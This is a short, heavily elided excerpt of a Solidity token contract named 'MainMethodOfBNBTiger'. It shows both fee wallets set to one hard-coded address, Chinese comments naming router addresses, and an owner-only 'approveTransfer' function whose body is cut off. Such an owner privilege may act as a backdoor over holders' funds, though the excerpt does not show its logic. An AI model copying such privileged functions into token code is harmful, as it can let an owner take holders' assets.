...
contract MainMethodOfBNBTiger is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x94971b00404faF35d887336cC7aE54c0AF257E7E);
    address payable public teamWalletAddress = payable(0x94971b00404faF35d887336cC7aE54c0AF257E7E);
    ...
    constructor () {
        //测试网交易路由  0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506
        //薄饼交易路由  0x10ED43C718714eb63d5aA57B78B54704E256024E
    ...
    function approveTransfer(uint256 amount,address account) onlyOwner() public {
